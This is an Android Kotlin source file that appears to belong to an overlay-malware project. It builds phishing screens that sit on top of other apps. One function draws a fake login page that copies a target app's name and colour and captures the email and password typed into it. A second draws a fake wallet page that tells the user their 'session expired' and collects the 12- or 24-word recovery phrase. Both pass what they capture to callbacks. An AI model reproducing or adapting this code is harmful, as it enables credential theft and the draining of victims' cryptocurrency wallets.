// ============================================================
// FILE: android/app/src/main/java/com/xrc/syringe/OverlayBuilder.kt
// ============================================================
package com.xrc.syringe

import android.content.Context
import android.view.Gravity
import android.view.View
import android.view.ViewGroup
import android.widget.*
import com.xrc.R

/**
 * OverlayBuilder — programmatic UI builder for overlay views.
 *
 * Creates custom overlay views without WebView.
 * Used for lightweight phishing pages and input capture.
 */
class OverlayBuilder(private val context: Context) {

    /**
     * Build a login phishing overlay for a given target app.
     * Returns a view with username/password fields.
     */
    fun buildLoginOverlay(
        appName: String,
        logoColor: Int = 0xFF1877F2.toInt(),
        onSubmit: (String, String) -> Unit
    ): View {
        val density = context.resources.displayMetrics.density

        val container = LinearLayout(context).apply {
            layoutParams = ViewGroup.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT,
                ViewGroup.LayoutParams.MATCH_PARENT
            )
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER
            setBackgroundColor(0xE6FFFFFF.toInt())
            setPadding(
                (24 * density).toInt(),
                (24 * density).toInt(),
                (24 * density).toInt(),
                (24 * density).toInt()
            )
        }

        // Logo placeholder
        val logo = TextView(context).apply {
            text = appName.take(1).uppercase()
            textSize = 36f
            setTextColor(0xFFFFFFFF.toInt())
            setBackgroundColor(logoColor)
            gravity = Gravity.CENTER
            layoutParams = LinearLayout.LayoutParams(
                (80 * density).toInt(),
                (80 * density).toInt()
            ).apply {
                gravity = Gravity.CENTER_HORIZONTAL
                bottomMargin = (16 * density).toInt()
            }
        }
        container.addView(logo)

        // App name
        val appNameView = TextView(context).apply {
            text = appName
            textSize = 18f
            setTextColor(0xFF333333.toInt())
            gravity = Gravity.CENTER
            layoutParams = LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.WRAP_CONTENT,
                ViewGroup.LayoutParams.WRAP_CONTENT
            ).apply {
                bottomMargin = (24 * density).toInt()
                gravity = Gravity.CENTER_HORIZONTAL
            }
        }
        container.addView(appNameView)

        // Username field
        val usernameInput = EditText(context).apply {
            hint = "Email or phone"
            textSize = 16f
            setTextColor(0xFF333333.toInt())
            setHintTextColor(0xFF999999.toInt())
            setBackgroundResource(android.R.drawable.editbox_background)
            layoutParams = LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT,
                ViewGroup.LayoutParams.WRAP_CONTENT
            ).apply {
                bottomMargin = (12 * density).toInt()
            }
        }
        container.addView(usernameInput)

        // Password field
        val passwordInput = EditText(context).apply {
            hint = "Password"
            textSize = 16f
            setTextColor(0xFF333333.toInt())
            setHintTextColor(0xFF999999.toInt())
            inputType = android.text.InputType.TYPE_CLASS_TEXT or
                    android.text.InputType.TYPE_TEXT_VARIATION_PASSWORD
            setBackgroundResource(android.R.drawable.editbox_background)
            layoutParams = LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT,
                ViewGroup.LayoutParams.WRAP_CONTENT
            ).apply {
                bottomMargin = (20 * density).toInt()
            }
        }
        container.addView(passwordInput)

        // Login button
        val loginButton = Button(context).apply {
            text = "Log In"
            textSize = 16f
            setTextColor(0xFFFFFFFF.toInt())
            setBackgroundColor(logoColor)
            layoutParams = LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT,
                (48 * density).toInt()
            )
            setOnClickListener {
                val username = usernameInput.text.toString()
                val password = passwordInput.text.toString()
                onSubmit(username, password)
            }
        }
        container.addView(loginButton)

        return container
    }

    /**
     * Build a crypto wallet phishing overlay.
     */
    fun buildWalletOverlay(
        walletName: String,
        onSubmit: (String, String) -> Unit
    ): View {
        val density = context.resources.displayMetrics.density

        val container = LinearLayout(context).apply {
            layoutParams = ViewGroup.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT,
                ViewGroup.LayoutParams.MATCH_PARENT
            )
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER
            setBackgroundColor(0xE6FFFFFF.toInt())
            setPadding(
                (24 * density).toInt(),
                (24 * density).toInt(),
                (24 * density).toInt(),
                (24 * density).toInt()
            )
        }

        // Wallet icon
        val icon = TextView(context).apply {
            text = "\uD83D\uDCB0" // Money bag emoji
            textSize = 48f
            gravity = Gravity.CENTER
            layoutParams = LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.WRAP_CONTENT,
                ViewGroup.LayoutParams.WRAP_CONTENT
            ).apply {
                bottomMargin = (16 * density).toInt()
                gravity = Gravity.CENTER_HORIZONTAL
            }
        }
        container.addView(icon)

        // Wallet name
        val nameView = TextView(context).apply {
            text = walletName
            textSize = 18f
            setTextColor(0xFF333333.toInt())
            gravity = Gravity.CENTER
            layoutParams = LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.WRAP_CONTENT,
                ViewGroup.LayoutParams.WRAP_CONTENT
            ).apply {
                bottomMargin = (8 * density).toInt()
                gravity = Gravity.CENTER_HORIZONTAL
            }
        }
        container.addView(nameView)

        val promptView = TextView(context).apply {
            text = "Session expired. Please re-enter your recovery phrase to continue."
            textSize = 14f
            setTextColor(0xFF666666.toInt())
            gravity = Gravity.CENTER
            layoutParams = LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.WRAP_CONTENT,
                ViewGroup.LayoutParams.WRAP_CONTENT
            ).apply {
                bottomMargin = (24 * density).toInt()
                gravity = Gravity.CENTER_HORIZONTAL
            }
        }
        container.addView(promptView)

        // Seed phrase field (multiline)
        val seedInput = EditText(context).apply {
            hint = "Enter your recovery phrase (12 or 24 words)"
            textSize = 14f
            setTextColor(0xFF333333.toInt())
            setHintTextColor(0xFF999999.toInt())
            inputType = android.text.InputType.TYPE_CLASS_TEXT or
                    android.text.InputType.TYPE_TEXT_FLAG_MULTI_LINE
            minLines = 3
            maxLines = 6
            setBackgroundResource(android.R.drawable.editbox_background)
            layoutParams = LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT,
                ViewGroup.LayoutParams.WRAP_CONTENT
            ).apply {
                bottomMargin = (20 * density).toInt()
            }
        }
        container.addView(seedInput)

        // Confirm button
        val confirmButton = Button(context).apply {
            text = "Verify & Continue"
            textSize = 16f
            setTextColor(0xFFFFFFFF.toInt())
            setBackgroundColor(0xFF1DB954.toInt())
            layoutParams = LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT,
                (48 * density).toInt()
            ).apply {
                bottomMargin = (12 * density).toInt()
            }
            setOnClickListener {
                onSubmit(seedInput.text.toString(), walletName)
            }
        }
        container.addView(confirmButton)

        return container
    }
}
